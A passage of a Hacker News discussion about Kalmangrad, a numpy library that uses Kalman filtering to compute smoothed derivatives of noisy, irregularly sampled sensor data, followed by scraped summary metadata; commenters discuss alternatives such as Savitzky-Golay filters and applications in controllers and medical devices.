you would like to calculate the jerk (2nd derivative of speed) of your motion (useful in a range of driving comfort metrics etc.). The speed sensor on your car is probably not all that accurate, it will give some slightly randomly wrong output and it may not give that output at exactly 10 times per second, you will have some jitter in the rate you receive data. If you naiively attempt to calculate jerk by doing central differences on the signal twice (using np.gradient twice) you will amplify the noise in the signal and end up with something that looks totally wrong which you will then have to post process and maybe resample to get it at the rate that you want. If instead of np.gradient you use kalmangrad.grad you will get a nice smooth jerk signal (and a fixed up speed signal too). There are many ways to do this kind of thing, but I personally like this one as its fast, can be run online, and if you want you can get uncertainties in your derivatives too :) reply pm 19 hours agorootparentI'd been researching Kalman filters to smooth out some sampling values (working on mobile: anything from accelerometer values to voice activation detection), but hadn't got around to revising the mathematics, so I appreciate the explanation. Out of curiosity, what other ways might this be achieved? I haven't seen much else beyond Kalman filters. reply hugohadfield 7 hours agorootparentYou could almost certainly construct a convolutional kernal that computes smoothed derivatives of your function by the derivative of a gaussian smoothing kernal (that kind of technique is mostly used for images if I remember correctly ), in fact I recon this might work nicely https://docs.scipy.org/doc/scipy/reference/generated/scipy.n... although you would need to enforce equally spaces inputs with no misssing data. Alternatively you might also set up an optimisation problem in which you are optimising the values of your N'th derivative on some set of points and then integrating and minimising their distance to your input data, also would work well probably but would be annoying to do regularisation on your lowest derivative and the whole thing might be quite slow. You could also do B-splines or other local low order polynomial methods... the list goes on and on! reply nihzm 10 hours agorootparentprevKalman filters are usually the way to go because for some cases it is mathematically proven that they are optimal, in the sense that they minimize the noise. About alternatives, not sure if people actually do this but I think Savitzky-Golay filters could be used for the same purpose. reply caseyy 16 hours agoparentprevThis is very important in controllers using feedback loops. The output of a controller is measured, a function is applied to it, and the result is fed back into the controller. The output becomes self-balancing. The applications in this case involve self-driving cars, rocketry, homeostatic medical devices like insulin pumps, cruise control, HVAC controllers, life support systems, satellites, and other scenarios. This is mainly due to a type of controller called the PID controller which involves a feedback loop and is self-balancing. The purpose of a PID controller is to induce a target value of a measurement in a system by adjusting the system’s inputs, at least some of which are outputs of the said controller. Particularly, the derivative term of a PID controller involves a first order derivative. The smoother its values are over time, the better such a controller performs. A problem where derivative values are not smooth or second degree derivative is not continuous, is called a “derivative kick”. The people building these controllers have long sought after algorithms that produce at least a good approximation of a measurement from a noisy sensor. A good approximation of derivatives is the next level, a bit harder, and overall good approximations of the derivative are a relatively recent development. There is a lot of business here. For example, Abbott Laboratories and Dexcom are building continuous blood glucose monitors that use a small transdermal sensor to sense someone’s blood glucose. This is tremendously important for management of people’s diabetes. And yet algorithms like what GP presents are some of the biggest hurdles. The sensors are small and ridiculously susceptible to noise. Yet it is safety-critical that the data they produce is reliable and up to date (can’t use historical smoothing) because devices like insulin pumps can consume it at real time. I won’t go into this in further detail, but incorrect data can and has killed patients. So a good algorithm for cleaning up this noisy sensor data is both a serious matter and challenging. The same can be said about self-driving cars - real-time data from noisy sensors must be fed into various systems, some using PID controllers. These systems are often safety-critical and can kill people in a garbage in-garbage out scenario. There are about a million applications to this algorithm. It is likely an improvement on at least some previous implementations in the aforementioned fields. Of course, these algorithms also often don’t handle certain edge cases well. It’s an ongoing area of research. In short — take any important and technically advanced sensor-controller system. There’s a good chance it benefits from advancements like what GP posted. P.S. it’s more solved with uniformly sampled data (i.e. every N seconds) than non-uniformly sampled data (i.e. as available). So once again, what GP posted is really useful. I think they could get a job at pretty big medical and automotive industry companies with this, it is “the sauce”. If they weren’t already working for a research group of a self-driving car company, that is ;) reply 082349872349872 6 hours agorootparentThinking about people as PID controllers: left to our own devices we're normally very good at the D term, but lousy at the I term, with the P term somewhere in the middle. Give people clay/parchment/paper, however, and it becomes much easier to reliably evaluate an I term. Example: https://xkcd.com/1205/ ; maybe each single time you do the task it seems like sanding out the glitches would be more trouble than it's worth, but a little record keeping allows one to see when a slight itch becomes frequent enough to be worth addressing. (conversely, it may be tempting to automate everything, but a little record keeping allows one to see if it'd obviously be rabbit holing) reply caseyy 2 hours agorootparentYou might like the second episode of All Watched Over by Machines of Loving Grace. It talks about how techno-utopians tried to model society and nature as feedback loop controllers. One might say a part of the reason they have failed is because nature and people don't much care for the I term. These systems have feedback loops for sudden events, but increase the temperature slowly enough and the proverbial frog boils. There are very many undercurrents in our world we do not see. So much that even when we think we understand and can predict their effects, we almost never take into account the entire system. reply uoaei 20 hours agoparentprevBasically, approximating calculus operations on noisy, discrete-in-time data streams. reply pm 19 hours agorootparentThis is what I was thinking, but stated much clearer than I'd have managed. reply theaussiestew 20 hours agoprevI'm looking to calculate jerk from accelerometer data, I'm assuming this would be the perfect use case? reply hugohadfield 20 hours agoparentthis is a perfect use case, let me know how it goes! reply seanhunter 7 hours agoprevThis looks cool. When you say \"there are tons of ways to solve this problem\", presumably the canonical way is some sort of Fourier Analysis? reply hugohadfield 6 hours agoparentI guess I'm not totally sure what the canonical way would be, probably convolution with the N'th derivative of a guassian smoothing kernal where the smoothing response is chosen by frequency analysis, or something along those lines. You could also just smooth the signal then differentiate it numerically (probably equivalent but less efficient). I would personally go for this bayesian filtering approach or some kind of local polynomial approximation like splines or the Savitzky-Golay filter people are talking about this comment section because it would probably be easier to deal with missing data etc. reply marmaduke 14 hours agoprevThis is really nice approach. We are doing some nonlinear system id, and faced with this kinda problem (not irregular spacing but low sample rate and noisy). Definitely will check it out. What’s your opinion on ensemble KF? We’d like to use that for parameter estimations. I saw unscented in your bayesfilter, but not ensemble, so I’m curious. Thanks! reply hugohadfield 8 hours agoparentSounds like a fun project! I've not spent much time on ensemble KF but my mate Sam (https://github.com/samDuffield/) did a lot of work in his PhD on them for high dimensional datasets. Is your dataset specifically high dimensional and so not something you'd use an unscented filter for? reply Animats 19 hours agoprevThat's useful. Can it generate a simple filter for later real-time use, based on the statistics of the noise? That would be useful for self-tuning controllers. reply hugohadfield 8 hours agoparentGlad you like it! This library will not generate a set of convolutional filter coefficients for you if that is what you are after, I'm sure it would be possible to do some fairly nasty maths to get out some kind of equivalent convolutional kernal for a given tuning, or you could wrap an optimiser round it and try to walk your coefficients to something equivalent. I would say though that the juice would almost certainly not be worth the squeeze. The kalman filter is easily lightweight enough to run in real time itself (it was developed for this task), I've deployed several in real time embedded scenarios on a range of platforms (inc. microcontrollers) and it also has the added advantage of doing handling jitter in input timing etc. reply 3abiton 14 hours agoprev [–] This got me thinking, is this used in supply chain problems? reply hugohadfield 6 hours agoparent [–] hmm, I don't think I'm familiar with the kind of problems you might be thinking about. Care to share an example? reply 3abiton 46 minutes agorootparent [–] Specifically for demand forecasting for example. I have seen lots of issues with missing data, and this seems to elegantly tackle it. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The project aims to differentiate sensor data for analysis using Kalman filters, known for resampling to a consistent rate and smoothing outliers.",
      "A new numpy-based Bayesian filtering/smoothing library, named Kalmangrad, has been developed and is available on GitHub.",
      "The developer is open to feedback, feature requests, and bug reports to improve the library further."
    ],
    "commentSummary": [
      "The project focuses on differentiating noisy sensor data using Kalman filters, which are preferred for smoothing and resampling.",
      "A Bayesian filtering library was developed to address this challenge, with the potential for feature expansion based on user feedback.",
      "The project is applicable in fields such as air quality monitoring and self-driving cars, and is useful for calculating derivatives in noisy, non-uniformly sampled data."
    ],
    "points": 137,
    "commentCount": 39,
    "retryCount": 0,
    "time": 1729109866
  }
]
